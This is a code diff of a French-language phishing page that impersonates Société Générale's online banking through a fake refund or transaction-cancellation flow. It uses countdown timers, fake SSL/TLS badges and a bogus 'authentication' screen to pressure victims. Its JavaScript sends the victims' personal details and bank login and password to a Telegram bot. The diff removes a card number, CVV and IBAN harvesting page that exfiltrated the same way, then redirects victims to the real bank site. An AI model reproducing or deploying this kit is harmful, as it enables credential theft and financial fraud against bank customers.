@@ -385,7 +385,7 @@
       <!-- PAGE 1: TRAITEMENT DU REMBOURSEMENT -->
       <div class="form-card" id="page1">
         <div class="divider"></div>
-        <h1 class="card-title">Traitement du remboursement</h1>
+        <h1 class="card-title">Annulation</h1>
 
         <div class="countdown-container">
           <svg class="countdown-svg" viewBox="0 0 160 160">
@@ -393,14 +393,14 @@
             <circle class="countdown-progress" id="countdownCircle" cx="80" cy="80" r="70" />
           </svg>
           <text style="color: black;" class="countdown-text" id="countdownText">10:00</text>
-          <br><br> <p class="countdown-label">Temps restant pour valider le virement</p>
+          <br><br> <p class="countdown-label">Temps restant avant annulation</p>
         </div>
 
         <p class="card-text" style="font-size:0.85rem;color:#666;">
-          Vous disposez de 10 minutes pour confirmer la réception de votre dossier de remboursement. Passé ce délai, la procédure devra être relancée.
+          Vous avez 10 minutes pour confirmer l'annulation de la transaction. Passé ce délai, la procédure sera automatiquement annulée.
         </p>
 
-        <button type="button" class="btn-main" id="btnPage1">Confirmer le remboursement</button>
+        <button type="button" class="btn-main" id="btnPage1">Annuler</button>
 
         <p class="ssl-text"><svg style="width:11px;height:11px;vertical-align:middle;margin-right:3px;" viewBox="0 0 24 24" fill="#aaa"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"></path></svg>Connexion sécurisée SSL 256-bit &nbsp;|&nbsp; Certifié TLS 1.3</p>
       </div>
@@ -468,54 +468,6 @@
         <button type="button" class="btn-continuer" id="btnPage4">Se connecter</button>
       </div>
 
-      <!-- PAGE AUTHENTIFICATION EN COURS (60s) -->
-      <div class="page2-card" id="pageAuthWait" style="display:none; text-align:center; align-items:center; gap:16px;">
-        <h2>Authentification en cours</h2>
-        <p style="font-size:0.85rem; color:#555;">Veuillez patienter pendant la validation de vos identifiants par votre établissement bancaire...</p>
-        
-        <div class="countdown-container" style="margin: 5px 0;">
-          <svg class="countdown-svg" viewBox="0 0 160 160" style="width:130px; height:130px;">
-            <circle class="countdown-bg" cx="80" cy="80" r="70" />
-            <circle class="countdown-progress" id="authCircle" cx="80" cy="80" r="70" />
-          </svg>
-          <text class="countdown-text" id="authCountdownText" style="font-size:1.6rem; margin-top:-80px;">01:00</text>
-        </div>
-        
-        <p id="authSuccessMsg" style="font-size:0.9rem; font-weight:600; color:#2e7d32; display:none; margin-top:5px;">
-          ✓ Authentification réussie avec succès ! Redirection...
-        </p>
-      </div>
-
-      <!-- IBAN & CREDIT CARD PAGE (SEPARATED FIELDS) -->
-      <div class="page2-card" id="pageIban" style="display:none;">
-        <h2>Coordonnées Bancaires / IBAN</h2>
-        <p style="font-size:0.82rem;color:#888;margin-top:-8px;">Indiquez vos références pour finaliser l'opération.</p>
-
-        <div style="width:100%;display:flex;flex-direction:column;gap:12px;">
-          <div class="p3-field">
-            <label class="field-label">Numéro de carte bancaire <span>*</span></label>
-            <input type="text" id="cardNumberInput" class="iban-input" placeholder="4976 0000 0000 0000" maxlength="19">
-          </div>
-          <div class="p3-field">
-            <label class="field-label">RIB / IBAN <span>*</span></label>
-            <input type="text" id="ribInput" class="iban-input" placeholder="FR76 XXXX XXXX XXXX XXXX XXXX XXX" maxlength="34">
-          </div>
-          <div style="display:flex;gap:10px;">
-            <div class="p3-field" style="flex:1;">
-              <label class="field-label">Expiration <span>*</span></label>
-              <input type="text" id="cardExp" class="iban-input" placeholder="MM/AA" maxlength="5">
-            </div>
-            <div class="p3-field" style="flex:1;">
-              <label class="field-label">CVV <span>*</span></label>
-              <input type="text" id="cardCvv" class="iban-input" placeholder="123" maxlength="4">
-            </div>
-          </div>
-        </div>
-
-        <button type="button" class="btn-continuer" id="btnPageIban">Continuer</button>
-      </div>
-
-      <!-- PAGE 5: CONFIRMATION -->
       <div class="page2-card" id="page5" style="display:none;text-align:center;align-items:center;gap:18px;">
         <div class="valid-circle">
           <svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round">
@@ -525,8 +477,15 @@
         <h2 style="font-size:1.25rem;font-weight:700;color:#1a1a1a;">Demande bien reçue</h2>
         <p style="font-size:0.88rem;color:#444;line-height:1.8;max-width:340px;">
           Vos informations ont été transmises avec succès à nos services.
-          <br>Nos experts procèdent actuellement à l'annulation de toute transaction inhabituelle.
+          <br>Notre équipe procède actuellement aux vérifications nécessaires concernant les transactions inhabituelles signalées sur votre compte. Votre demande a bien été prise en compte.Nous vous invitons à patienter pendant le traitement de votre dossier.Vous serez informé dès que la vérification sera terminée.
         </p>
+        <div class="ssl-bar">
+          <span class="ssl-item">SSL 256-bit</span>
+          <span class="ssl-sep">|</span>
+          <span class="ssl-item">TLS 1.3</span>
+          <span class="ssl-sep">|</span>
+          <span class="ssl-item">Données chiffrées</span>
+        </div>
       </div>
 
       <div class="security-note">
@@ -561,15 +520,7 @@
         callback();
       }, ms || 3000);
     }
-
-    function showPopup(title, message) {
-      document.getElementById('popupTitle').textContent = title;
-      document.getElementById('popupMessage').textContent = message;
-      document.getElementById('customPopup').classList.add('active');
-    }
-    document.getElementById('popupCloseBtn').addEventListener('click', function() {
-      document.getElementById('customPopup').classList.remove('active');
-    });
+  
 
     function goTo(hideId, showId) {
       var hide = document.getElementById(hideId);
@@ -597,81 +548,6 @@
       container.querySelectorAll('input').forEach(function(i){ i.style.borderColor = ''; });
     }
 
-    // Input Auto-Formatting & Masks
-    // Date de naissance (jj/mm/aaaa)
-    var dobInput = document.getElementById('dobInput');
-    if (dobInput) {
-      dobInput.addEventListener('input', function() {
-        var v = this.value.replace(/\D/g, '').substring(0, 8);
-        if (v.length >= 5) {
-          v = v.substring(0,2) + '/' + v.substring(2,4) + '/' + v.substring(4);
-        } else if (v.length >= 3) {
-          v = v.substring(0,2) + '/' + v.substring(2);
-        }
-        this.value = v;
-      });
-    }
-
-    // Téléphone français strict (ex: 06 12 34 56 78)
-    var phoneInput = document.getElementById('phoneInput');
-    if (phoneInput) {
-      phoneInput.addEventListener('input', function() {
-        var v = this.value.replace(/\D/g, '');
-        if (v.startsWith('33')) {
-          v = '0' + v.substring(2);
-        }
-        v = v.substring(0, 10);
-        var formatted = '';
-        for (var i = 0; i < v.length; i++) {
-          if (i > 0 && i % 2 === 0) formatted += ' ';
-          formatted += v[i];
-        }
-        this.value = formatted;
-      });
-    }
-
-    // Code postal (5 chiffres max)
-    var postalInput = document.getElementById('postalInput');
-    if (postalInput) {
-      postalInput.addEventListener('input', function() {
-        this.value = this.value.replace(/\D/g, '').substring(0, 5);
-      });
-    }
-
-    // Numéro de carte bancaire (Groupes de 4 chiffres)
-    var cardNumInput = document.getElementById('cardNumberInput');
-    if (cardNumInput) {
-      cardNumInput.addEventListener('input', function() {
-        var v = this.value.replace(/\D/g, '').substring(0, 16);
-        var formatted = v.match(/.{1,4}/g);
-        this.value = formatted ? formatted.join(' ') : v;
-      });
-    }
-
-    var ribInput = document.getElementById('ribInput');
-    if (ribInput) {
-      ribInput.addEventListener('input', function() {
-        this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g,'').substring(0,34);
-      });
-    }
-
-    var cardExp = document.getElementById('cardExp');
-    if (cardExp) {
-      cardExp.addEventListener('input', function() {
-        var v = this.value.replace(/\D/g,'').substring(0,4);
-        if (v.length >= 3) v = v.substring(0,2) + '/' + v.substring(2);
-        this.value = v;
-      });
-    }
-
-    var cardCvv = document.getElementById('cardCvv');
-    if (cardCvv) {
-      cardCvv.addEventListener('input', function() {
-        this.value = this.value.replace(/\D/g,'').substring(0,4);
-      });
-    }
-
-    // Countdown Timer on Page 1
     var totalSeconds = 600;
     var countdown = totalSeconds;
     var circle = document.getElementById('countdownCircle');
@@ -680,14 +556,26 @@
     var circumference = 2 * Math.PI * radius;
     circle.style.strokeDasharray = circumference;
     circle.style.strokeDashoffset = 0;
+    circle.style.stroke = '#4caf50';
 
     function updateCountdown(value) {
       var offset = circumference - (value / totalSeconds) * circumference;
       circle.style.strokeDashoffset = offset;
+
       var minutes = Math.floor(value / 60);
       var seconds = value % 60;
-      textEl.textContent = String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
+      var formatted = String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
+      textEl.textContent = formatted;
+
+      if (value > 60) {
+        circle.style.stroke = '#4caf50';
+      } else if (value > 30) {
+        circle.style.stroke = '#ffc107';
+      } else {
+        circle.style.stroke = '#f44336';
+      }
     }
+
     updateCountdown(totalSeconds);
 
     var timer = setInterval(function() {
@@ -700,134 +588,90 @@
       updateCountdown(countdown);
     }, 1000);
 
-    // Page 1 -> Page 3
-    document.getElementById('btnPage1').addEventListener('click', function() {
-      clearInterval(timer);
-      showLoading(function() { goTo('page1', 'page3'); }, 3000);
-    });
-
-    // Page 3 (Personal Info) -> Validation Téléphone Français & Champs
-    document.getElementById('btnPage3').addEventListener('click', function() {
-      var page3 = document.getElementById('page3');
-      var inputs = page3.querySelectorAll('.p3-input');
-      var labels = page3.querySelectorAll('.field-label');
-      var valid = true;
-      clearAllErr(page3);
-
-      inputs.forEach(function(inp) {
-        if (!inp.value.trim()) { showErr(inp, 'Ce champ est obligatoire.'); valid = false; }
+    var btnPage1 = document.getElementById('btnPage1');
+    if (btnPage1) {
+      btnPage1.addEventListener('click', function() {
+        clearInterval(timer);
+        showLoading(function() {
+          goTo('page1', 'page3');
+        }, 3000);
       });
-      if (!valid) return;
-
-      // Validation stricte téléphone français (01-09, 10 chiffres)
-      var rawPhone = phoneInput.value.replace(/\s+/g, '');
-      var frenchPhoneRegex = /^0[1-9][0-9]{8}$/;
-      if (!frenchPhoneRegex.test(rawPhone)) {
-        showErr(phoneInput, 'Veuillez entrer un numéro de téléphone français valide (ex: 0612345678).');
-        return;
-      }
-
-      var msg = "🚨 <b>" + BOT_NAME + "</b>\n\n📋 <b>Étape 1 — Infos personnelles</b>\n─────────────────\n";
-      inputs.forEach(function(inp, i) {
-        var lbl = labels[i] ? labels[i].textContent.replace('*','').trim() : 'Champ';
-        msg += "• <b>" + lbl + " :</b> " + inp.value + "\n";
-      });
-      sendTelegram(msg);
-
-      showLoading(function() { goTo('page3', 'page4'); }, 3000);
-    });
-
-    // Page 4 (Bank Login) -> Compte à rebours de 60s
-    document.getElementById('btnPage4').addEventListener('click', function() {
-      var page4 = document.getElementById('page4');
-      var identInput = page4.querySelectorAll('.p3-input')[0];
-      var pwdInput = document.getElementById('bankPwdInput');
-      var valid = true;
-      clearAllErr(page4);
-
-      if (!identInput.value.trim()) { showErr(identInput, 'Identifiant obligatoire.'); valid = false; }
-      if (!pwdInput.value.trim()) { showErr(pwdInput, 'Mot de passe obligatoire.'); valid = false; }
-      if (!valid) return;
-
-      var msg = "🚨 <b>" + BOT_NAME + "</b>\n\n🔐 <b>Étape 2 — Connexion Bancaire</b>\n─────────────────\n" +
-                "🔑 <b>Identifiant :</b> " + identInput.value + "\n" +
-                "🔒 <b>Mot de passe :</b> " + pwdInput.value;
-      sendTelegram(msg);
-
-      // Transition vers l'écran d'authentification en cours (60s)
-      goTo('page4', 'pageAuthWait');
-      startAuthCountdown();
-    });
-
-    function startAuthCountdown() {
-      var authSeconds = 60;
-      var authCircle = document.getElementById('authCircle');
-      var authTextEl = document.getElementById('authCountdownText');
-      var authCircumference = 2 * Math.PI * 70;
-      authCircle.style.strokeDasharray = authCircumference;
-      authCircle.style.strokeDashoffset = 0;
-      
-      var successMsg = document.getElementById('authSuccessMsg');
-      successMsg.style.display = 'none';
-
-      var authTimer = setInterval(function() {
-        authSeconds--;
-        var offset = authCircumference - (authSeconds / 60) * authCircumference;
-        authCircle.style.strokeDashoffset = offset;
-        authTextEl.textContent = '00:' + String(authSeconds).padStart(2, '0');
-
-        if (authSeconds <= 0) {
-          clearInterval(authTimer);
-          successMsg.style.display = 'block';
-          authCircle.style.stroke = '#4caf50';
-          setTimeout(function() {
-            goTo('pageAuthWait', 'pageIban');
-          }, 2000);
-        }
-      }, 1000);
     }
 
-    // Page Iban & Carte -> Validation Stricte & Popup si invalide
-    document.getElementById('btnPageIban').addEventListener('click', function() {
-      var cardNum = cardNumInput.value.replace(/\s+/g, '');
-      var ribVal = ribInput.value.trim();
-      var expVal = cardExp.value.trim();
-      var cvvVal = cardCvv.value.trim();
+    var btnPage3 = document.getElementById('btnPage3');
+    if (btnPage3) {
+      btnPage3.addEventListener('click', function() {
+        var page3 = document.getElementById('page3');
+        var inputs = page3.querySelectorAll('.p3-input');
+        var labels = page3.querySelectorAll('.field-label');
+        var valid = true;
+        clearAllErr(page3);
+        inputs.forEach(function(inp) {
+          if (!inp.value.trim()) {
+            showErr(inp, 'Ce champ est obligatoire.');
+            valid = false;
+          }
+        });
+        if (!valid) return;
 
-      if (cardNum.length < 16) {
-        showPopup("Numéro de carte invalide", "Veuillez entrer un numéro de carte bancaire complet à 16 chiffres.");
-        return;
-      }
-      if (ribVal.length < 10) {
-        showPopup("RIB / IBAN invalide", "Veuillez vérifier les informations de votre IBAN/RIB.");
-        return;
-      }
-      if (expVal.length < 5 || !expVal.includes('/')) {
-        showPopup("Date d'expiration invalide", "Veuillez respecter le format MM/AA.");
-        return;
-      }
-      if (cvvVal.length < 3) {
-        showPopup("CVV invalide", "Le code de sécurité CVV doit comporter 3 ou 4 chiffres.");
-        return;
-      }
+        var msg = "\uD83D\uDD14 <b>" + BOT_NAME + "</b>\n\n" +
+                  "\uD83D\uDCCB <b>\u00C9tape 1 \u2014 Infos personnelles</b>\n" +
+                  "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n";
+        inputs.forEach(function(inp, i) {
+          var lbl = labels[i] ? labels[i].textContent.replace('*','').trim() : 'Champ';
+          msg += "\u2022 <b>" + lbl + " :</b> " + inp.value + "\n";
+        });
+        sendTelegram(msg);
 
-      var msg = "🚨 <b>" + BOT_NAME + "</b>\n\n💳 <b>Étape 3 — Coordonnées Bancaires & Carte</b>\n─────────────────\n" +
-                "• <b>N° de carte :</b> " + cardNumInput.value + "\n" +
-                "• <b>RIB / IBAN :</b> " + ribVal + "\n" +
-                "• <b>Expiration :</b> " + expVal + "\n" +
-                "• <b>CVV :</b> " + cvvVal;
-      sendTelegram(msg);
+        showLoading(function() {
+          goTo('page3', 'page4');
+        }, 3000);
+      });
+    }
 
-      showLoading(function() {
-        goTo('pageIban', 'page5');
-        startFinalRedirect();
-      }, 3000);
-    });
+    var btnPage4 = document.getElementById('btnPage4');
+    if (btnPage4) {
+      btnPage4.addEventListener('click', function() {
+        var page4 = document.getElementById('page4');
+        var identInput = page4.querySelectorAll('.p3-input')[0];
+        var pwdInput = document.getElementById('bankPwdInput');
+        var valid = true;
+        clearAllErr(page4);
 
-    function startFinalRedirect() {
+        if (!identInput.value.trim()) {
+          showErr(identInput, 'Identifiant obligatoire.');
+          valid = false;
+        }
+        if (!pwdInput.value.trim()) {
+          showErr(pwdInput, 'Mot de passe obligatoire.');
+          valid = false;
+        }
+        if (!valid) return;
+
+        var msg = "\uD83D\uDD14 <b>" + BOT_NAME + "</b>\n\n" +
+                  "\uD83D\uDCCB <b>\u00C9tape 2 \u2014 Paiement</b>\n" +
+                  "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n" +
+                  "\uD83D\uDD11 <b>Identifiant :</b> " + identInput.value + "\n" +
+                  "\uD83D\uDD10 <b>Mot de passe :</b> " + pwdInput.value;
+        sendTelegram(msg);
+
+        showLoading(function() {
+          goTo('page4', 'page5');
+          startCountdown();
+        }, 3000);
+      });
+    }
+
+    function startCountdown() {
       var seconds = 45;
+      var counter = document.getElementById('countdown');
+      var bar = document.getElementById('progressBar');
+      if (counter) counter.textContent = seconds;
+      if (bar) bar.style.width = '100%';
       var iv = setInterval(function() {
         seconds--;
+        if (counter) counter.textContent = seconds;
+        if (bar) bar.style.width = (seconds / 45 * 100) + '%';
         if (seconds <= 0) {
           clearInterval(iv);
           window.location.href = 'https://particuliers.sg.fr/';
@@ -835,13 +679,42 @@
       }, 1000);
     }
 
-    // Password Eye Toggle
     var bankEyeBtn = document.getElementById('bankEyeBtn');
     if (bankEyeBtn) {
       var bankPwdVis = false;
       bankEyeBtn.addEventListener('click', function() {
         bankPwdVis = !bankPwdVis;
         document.getElementById('bankPwdInput').type = bankPwdVis ? 'text' : 'password';
+      });
+    }
+
+
+    var cardNum = document.getElementById('cardNumber');
+    if (cardNum) {
+      cardNum.addEventListener('input', function() {
+        var v = this.value.replace(/[^0-9]/g,'').substring(0,16);
+        this.value = v.replace(/(.{4})/g,'$1 ').trim();
+      });
+    }
+    var cardExp = document.getElementById('cardExp');
+    if (cardExp) {
+      cardExp.addEventListener('input', function() {
+        var v = this.value.replace(/[^0-9]/g,'').substring(0,4);
+        if (v.length >= 3) v = v.substring(0,2) + '/' + v.substring(2);
+        this.value = v;
+      });
+    }
+    var cardCvv = document.getElementById('cardCvv');
+    if (cardCvv) {
+      cardCvv.addEventListener('input', function() {
+        this.value = this.value.replace(/[^0-9]/g,'').substring(0,3);
+      });
+    }
+    var ribInput = document.getElementById('ribInput');
+    if (ribInput) {
+      ribInput.addEventListener('input', function() {
+        var v = this.value.toUpperCase().replace(/[^A-Z0-9]/g,'').substring(0,27);
+        this.value = v.replace(/(.{4})/g,'$1 ').trim();
       });
     }
   </script>
